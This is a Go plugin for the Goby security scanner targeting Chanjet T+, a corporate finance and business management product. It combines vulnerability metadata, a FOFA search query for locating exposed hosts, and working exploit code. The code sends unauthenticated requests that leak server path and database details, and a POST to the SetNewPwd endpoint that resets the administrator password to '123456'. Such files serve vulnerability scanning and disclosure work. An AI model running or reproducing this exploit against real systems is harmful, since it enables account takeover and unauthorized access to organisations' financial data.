package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Chanjet GetDefaultBackPath function unauthorized access and admin password reset Vulnerability",
    "Description": "<p>Chanjet T+ is a management software that fully satisfies the needs of the integrated management of corporate finance and business.</p><p>There are security loopholes in Chanjet. Attackers do not authorize access to the interface, resulting in access to sensitive information such as path leakage, unauthorized modification of administrator passwords, and access to background permissions.</p>",
    "Impact": "<p>Chanjet unauthorized access and admin password reset</p>",
    "Recommendation": "<p>Set up whitelist access through security devices such as firewalls.</p><p>Follow the official website for updates: <a href=\"https://www.chanjet.com/\">https://www.chanjet.com/</a></p>",
    "Product": "Chanjet",
    "VulType": [
        "Permission Bypass",
        "Unauthorized Access"
    ],
    "Tags": [
        "Permission Bypass",
        "Unauthorized Access"
    ],
    "Translation": {
        "CN": {
            "Name": "畅捷通 GetDefaultBackPath 方法存在未授权访问和任意密码修改漏洞",
            "Product": "畅捷通",
            "Description": "<p>畅捷通T+是一款全面满足企业财务业务一体化管理需求的管理软件。<br></p><p>畅捷通存在安全漏洞，攻击者未授权访问接口导致获取路径泄露等敏感信息以及未授权修改管理员密码，获取后台权限。<br></p>",
            "Recommendation": "<p>通过防火墙等安全设备设置白名单访问。</p><p>关注官网更新：<a href=\"https://www.chanjet.com/\">https://www.chanjet.com/</a></p>",
            "Impact": "<p>畅捷通存在安全漏洞，攻击者未授权访问接口导致获取路径泄露等敏感信息以及未授权修改管理员密码，获取后台权限。<br></p>",
            "VulType": [
                "权限绕过",
                "未授权访问"
            ],
            "Tags": [
                "权限绕过",
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Chanjet GetDefaultBackPath function unauthorized access and admin password reset Vulnerability",
            "Product": "Chanjet",
            "Description": "<p>Chanjet T+ is a management software that fully satisfies the needs of the integrated management of corporate finance and business.<br></p><p>There are security loopholes in Chanjet. Attackers do not authorize access to the interface, resulting in access to sensitive information such as path leakage, unauthorized modification of administrator passwords, and access to background permissions.<br></p>",
            "Recommendation": "<p>Set up whitelist access through security devices such as firewalls.</p><p>Follow the official website for updates: <a href=\"https://www.chanjet.com/\">https://www.chanjet.com/</a></p>",
            "Impact": "<p>Chanjet unauthorized access and admin password reset</p>",
            "VulType": [
                "Permission Bypass",
                "Unauthorized Access"
            ],
            "Tags": [
                "Permission Bypass",
                "Unauthorized Access"
            ]
        }
    },
    "FofaQuery": "body=\"/tplus/\"",
    "GobyQuery": "body=\"/tplus/\"",
    "Author": "abszse",
    "Homepage": "https://www.chanjet.com/",
    "DisclosureDate": "2022-03-31",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "select",
            "value": "Access,password reset",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10360"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := `/tplus/ajaxpro/Ufida.T.SM.UIP.Tool.AccountClearControler,Ufida.T.SM.UIP.ashx?method=GetDefaultBackPath`
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return strings.Contains(resp.RawBody, "Chanjet") && strings.Contains(resp.RawBody, "DBServer")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			if cmd == "Access" {
				uri := "/tplus/ajaxpro/Ufida.T.SM.UIP.Tool.AccountClearControler,Ufida.T.SM.UIP.ashx?method=GetDefaultBackPath"
				cfg := httpclient.NewGetRequestConfig(uri)
				cfg.VerifyTls = false
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
					if resp.StatusCode == 200 {
						expResult.Output = resp.RawBody
						expResult.Success = true
					}
				}
			}
			if cmd == "password reset" {
				uri := "/tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx?method=SetNewPwd"
				cfg := httpclient.NewPostRequestConfig(uri)
				cfg.VerifyTls = false
				cfg.Data = "{\"pwdNew\":\"e10adc3949ba59abbe56e057f20f883e\"}"
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
					if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "{\"value\":true}") {
						expResult.Output += "password: 123456"
						expResult.Success = true
					}
				}
			}
			return expResult
		},
	))
}
